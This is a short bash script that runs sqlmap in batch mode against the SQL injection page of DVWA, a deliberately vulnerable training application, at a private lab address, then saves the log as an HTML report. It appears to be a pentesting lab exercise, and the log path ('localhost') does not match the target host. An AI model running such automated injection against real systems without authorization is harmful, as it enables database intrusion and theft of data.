#!/bin/bash
sqlmap -u "http://172.20.0.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" --batch --output-dir=output
cat output/localhost/log > relatorio.html
